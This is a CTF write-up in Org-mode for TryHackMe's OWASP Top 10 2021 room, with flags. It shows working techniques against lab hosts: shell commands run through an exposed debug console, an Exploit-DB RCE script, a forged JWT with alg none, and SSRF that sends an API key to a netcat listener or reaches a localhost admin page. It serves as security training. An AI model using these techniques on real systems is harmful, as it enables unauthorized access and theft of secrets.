@@ -1,0 +1,214 @@
+#+TITLE: OWASP Top 10 2021
+#+AUTHOR: Bryan Rinders
+#+DATE: <2023-10-25 Wed>
+#+OPTIONS: num:nil
+#+PROPERTY: header-args :results output :exports both :eval never-export
+#+PROPERTY: header-args:python :session *natas-python-session*
+
+{{{date([%Y-%m-%d])}}}
+
+Write up for the challenges in the tryhackme room [[https://tryhackme.com/room/owasptop102021][OWASP Top 10 2021]].
+
+* Task 11 Insecure design
+:PROPERTIES:
+:CUSTOM_ID: Task-11-Insecure-design
+:END:
+Visit the page =ht​tp://MACHINE_IP:PORT= and click on the 'I forgot my
+password' link and enter the username =joseph=. You will be brought to
+a page where you have to answer a security question. Two questions
+might be easily guessed:
+- What is you first pet's current address?
+
+  With possible answers:
+  + Heaven
+  + Hell
+
+- What is your favourite color?
+
+  Possible answers:
+  + blue
+  + green
+  + black
+  + red
+
+After trying these answers it turns out =green= is joseph's favourite
+color. We are given a new password with which we can login to his
+account and read the flag from =flag.txt=.
+
+#+begin_example
+THM{Not_3ven_c4tz_c0uld_sav3_U!}
+#+end_example
+
+* Task 12 Security Misconfiguration
+:PROPERTIES:
+:CUSTOM_ID: Task-12-Security-Misconfiguration
+:END:
+Go to =h​ttp://MACHINE_IP:PORT/console= and enter in the console
+
+#+begin_src python
+  import os; print(os.popen("ls -l").read())
+#+end_src
+
+The database file name is: =todo.db=.
+
+To get the value of =secret_flag= inside =app.py= run from the console:
+
+#+begin_src python
+  print(os.popen("grep secret_flag app.py").read())
+#+end_src
+
+The flag is:
+
+#+begin_example
+THM{Just_a_tiny_misconfiguration}
+#+end_example
+
+* Task 15 Vulnerable And Outdated Components
+:PROPERTIES:
+:CUSTOM_ID: Task-15-Vulnerable-And-Outdated-Components
+:END:
+Go to the page =h​ttp://MACHINE_IP:PORT=. After look around the website
+for a bit the most interesting page in the admin login page. Trying
+=admin:admin= as =username:password= turns out to actually work. After
+some more browsing it is unclear what to do so the hint suggests to
+search for 'remote command executions in bookstore app', which bring
+up [[https://www.exploit-db.com/exploits/47887]]. Downloading this script
+to the attackbox and executing it with:
+
+#+begin_src sh
+  python 47887.py
+#+end_src
+
+results in RCE. Type =y= when prompted on the command line and
+
+#+begin_src sh
+  cat /opt/flag.txt
+#+end_src
+
+to get the flag
+
+#+begin_example
+THM{But_1ts_n0t_my_f4ult!}
+#+end_example
+
+* Task 20 Data Integrity Failures
+:PROPERTIES:
+:CUSTOM_ID: Task-20-Data-Integrity-Failures
+:END:
+The password for the =guest= account is =guest=.
+
+Find the cookie as described in the task description and ~base64~
+decode the first two values.
+
+#+begin_example
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjk4MzAwNTI0fQ.BVUSmKNixf99vZZdga_n9QRJL2WwoGbKYSe1xF6yD0M
+#+end_example
+
+#+begin_src sh
+  echo "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9" | base64 -d
+  echo
+  echo "eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjk4Mjk4ODUxfQ==" | base64 -d
+#+end_src
+
+#+RESULTS:
+: {"typ":"JWT","alg":"HS256"}
+: {"username":"guest","exp":1698298851}
+
+Note that the second decoded value must be padded with two === signs,
+because there must be a multiple of 4 characters in the encoded
+string.
+
+Now change the =username= to 'admin' and the =alg= to 'none' and
+base64 encode those strings.
+
+#+begin_src sh
+  echo '{"username":"admin","exp":1698298851}' | base64
+  echo '{"typ":"JWT","alg":"none"}' | base64
+#+end_src
+
+#+RESULTS:
+: eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk4Mjk4ODUxfQo=
+: eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K
+
+replace the cookie values with the new encoded values seperated with a
+dot (do not include the original signature)
+
+#+begin_example
+eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjk4Mjk4ODUxfQo=.eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.
+#+end_example
+
+Refresh the web pages to get the flag:
+
+#+begin_example
+THM{Dont_take_cookies_from_strangers}
+#+end_example
+
+* Task 21 Security Logging And Monitoring Failures
+:PROPERTIES:
+:CUSTOM_ID: Task-21-Security-Logging-And-Monitoring-Failures
+:END:
+When you open the supplied file it is obvious the IP of the attacker
+is:
+
+#+begin_example
+49.99.13.16
+#+end_example
+
+And the type of attack is:
+
+#+begin_example
+brute force
+#+end_example
+
+* Task 22 Server Side Request Forgery
+:PROPERTIES:
+:CUSTOM_ID: Task-22-Server-Side-Request-Forgery
+:END:
+Go to the admin area, it will tell you only =localhost= can login as
+admin.
+
+Checking the source of the home page of this website you can see that
+the =download resume= button points to:
+
+#+begin_example
+secure-file-storage.com
+#+end_example
+
+To get the API key, open a terminal on the attackbox and run:
+
+#+begin_src sh
+  nc -lvp 8080
+#+end_src
+
+then via the browser go to
+[[http://MACHINE_IP:PORT/ATTACKBOX_IP:8080&id=1]] the API key wil then be
+shown on the netcat terminal:
+
+#+begin_example
+THM{Hello_Im_just_an_API_key}
+#+end_example
+
+** Extra Mile
+:PROPERTIES:
+:CUSTOM_ID: Extra-Mile
+:END:
+Because the admin page is only accessible from =localhost= we can do
+the same trick as before but instead of using ~netcat~ you use
+=localhost= as the server, with =/admin= as path. However if you try
+to go to
+[[http://MACHINE_IP:PORT/download?server=localhost:8087/admin&id=1]] you
+will notice that it downloads =download.pdf=, which is empty. We need
+to somehow make the server ignore the =id= (we can not leave =id= out
+of the url). A trick to do this is to use the pound sign, =#=. The
+pound sign must be url encode, =%23=, to have the server decode it and
+send a request to [[http://localhost:8087/admin#&id=1]] which will then ignore
+the =id= value.
+
+So the attack url will be:
+[[http://MACHINE_IP:PORT/download?server=localhost:8087/admin%23&id=1]]
+
+And the flag is:
+
+#+begin_example
+thm{c4n_i_haz_flagz_plz?}
+#+end_example
